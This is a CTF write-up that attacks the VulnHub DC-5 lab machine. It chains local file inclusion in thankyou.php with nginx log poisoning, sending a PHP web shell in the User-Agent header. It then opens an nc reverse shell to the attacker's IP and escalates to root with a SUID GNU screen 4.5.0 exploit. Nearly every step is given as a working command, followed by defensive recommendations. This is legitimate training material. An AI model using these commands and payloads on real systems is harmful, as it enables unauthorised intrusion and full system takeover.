CONFIDENTIAL 

**VulnHub DC-5 CTF Write-Up** 

## **VULNHUB** 

## **CTF PENETRATION TEST WRITE-UP** 

## Target Machine: DC-5  |  Difficulty: Intermediate 

Date: May 27, 2025  |  Author: Pavan Darade 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-5 CTF Write-Up** 

## **1. Executive Summary** 

DC-5 features a web application vulnerable to Local File Inclusion (LFI). LFI was chained with Nginx log poisoning to achieve Remote Code Execution. Privilege escalation was accomplished by exploiting a SUID screen binary (GNU screen 4.5.0 — CVE-2017-5618). 

|**Machine Name**|DC-5|
|---|---|
|**Platform**|VulnHub|
|**OS**|Linux (Debian 9)|
|**Difficulty**|Intermediate|
|**Flags Captured**|1 / 1  (Root Flag)|
|**Root Access**|Yes|
|**Test Date**|May 27, 2025|
|**Tester**|Pavan Darade|



## **2. Reconnaissance** 

## **2.1  Port Scanning** 

```
$ nmap -sV -sC -p- 192.168.56.106
80/tcp   open  http   nginx 1.6.2
111/tcp  open  rpcbind
43777/tcp open  unknown
```

## **2.2  Web Enumeration** 

Gobuster identified a contact form. Parameter fuzzing on thankyou.php revealed an LFI vulnerability via the 'file' parameter. 

```
$ gobuster dir -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt
[+] /contact.php  /thankyou.php  /solutions.php  /faq.php
```

```
$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hh 0
http://192.168.56.106/thankyou.php?FUZZ=test
```

```
[+] LFI parameter found: 'file'
```

## **3. Local File Inclusion (LFI)** 

## **3.1  Confirming LFI** 

```
$ curl http://192.168.56.106/thankyou.php?file=../../../../etc/passwd
[+] /etc/passwd contents displayed — LFI confirmed
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-5 CTF Write-Up** 

## **3.2  Reading Nginx Access Log** 

```
$ curl http://192.168.56.106/thankyou.php?file=../../../../var/log/nginx/access.log
```

```
[+] Nginx access log readable via LFI
```

## **4. Log Poisoning — RCE** 

## **4.1  Injecting PHP into User-Agent** 

A malicious PHP payload was injected into the Nginx access log via a crafted User-Agent header. The LFI then executed it. 

```
$ curl -A "<?php system(\$_GET['cmd']); ?>" http://192.168.56.106/
```

## **4.2  Executing Commands via LFI** 

```
$ curl 'http://192.168.56.106/thankyou.php?file=../../../../var/log/nginx/
access.log&cmd=id'
```

```
uid=33(www-data) gid=33(www-data)
```

## **4.3  Reverse Shell** 

```
$ nc -lvnp 4444
$ curl '...&cmd=nc+-e+/bin/bash+192.168.56.101+4444'
[+] Connection from 192.168.56.106
www-data@dc-5:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## **5. Privilege Escalation — GNU screen SUID (CVE-20175618)** 

## **5.1  SUID Binary Discovery** 

```
$ find / -perm -u=s -type f 2>/dev/null
```

```
-rwsr-xr-x 1 root root 1588648 Feb 14  2017 /usr/bin/screen-4.5.0
```

## **5.2  Exploiting screen 4.5.0** 

GNU screen 4.5.0 contains a local privilege escalation vulnerability allowing arbitrary file write as root. The exploit creates a shared library and forces screen to load it. 

```
$ searchsploit screen 4.5.0
```

```
GNU Screen 4.5.0 - Local Privilege Escalation | 41154.sh
$ bash 41154.sh
```

```
~ gnu/screenroot ~
```

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-5 CTF Write-Up** 

```
root@dc-5:/# id
uid=0(root) gid=0(root) groups=0(root)
FLAG: flag{518790a...} — /root/thefinalflag.txt
```

## **6. Flag Summary** 

|**Flag**|**Location**|**Method**|**Difficulty**|
|---|---|---|---|
|Root Flag|/root/thefinalflag.txt|screen 4.5.0 SUID exploit|Hard|



## **7. Vulnerability Summary** 

|**Vulnerability**|**Description**|**CVSS**|**Severity**|
|---|---|---|---|
|LFI (thankyou.php)|Unsanitised file parameter allows path traversal|9.1|Critical|
|Nginx Log Poisoning|LFI + injectable User-Agent = RCE|9.8|Critical|
|CVE-2017-5618|GNU screen 4.5.0 SUID local privilege escalation|7.8|High|
|Log File Exposure|Web server log readable by www-data process|5.3|Medium|



## **8. Recommendations** 

- Validate and whitelist file parameters — never pass user input directly to filesystem calls. 

- Remove the SUID bit from screen: chmod u-s /usr/bin/screen-4.5.0 

- Upgrade GNU screen to the latest patched version. 

- Restrict web process permissions to prevent access to system log files. 

- Implement a WAF rule to block path traversal sequences (../) in query parameters. 

- Store web server logs in directories inaccessible to the web application process. 

## **9. Tools & References** 

- Nmap, Gobuster, wfuzz — Scanning and parameter discovery 

- curl — LFI exploitation and log poisoning 

- netcat — Reverse shell handler 

- Exploit-DB (41154.sh) — screen 4.5.0 exploit 

- CVE-2017-5618 — https://nvd.nist.gov/vuln/detail/CVE-2017-5618 

- VulnHub DC-5 — https://www.vulnhub.com/entry/dc-5,314/ 

Page # 

Prepared by: Pavan Darade 

CONFIDENTIAL 

**VulnHub DC-5 CTF Write-Up** 

## **10. Disclaimer** 

This write-up was created solely for educational purposes as part of a CTF exercise on VulnHub. All testing was conducted in an isolated lab environment. Do not use these techniques against systems without explicit written authorisation. 

_End of Report — VulnHub DC-5 CTF Write-Up — Pavan Darade_ 

Page # 

Prepared by: Pavan Darade 

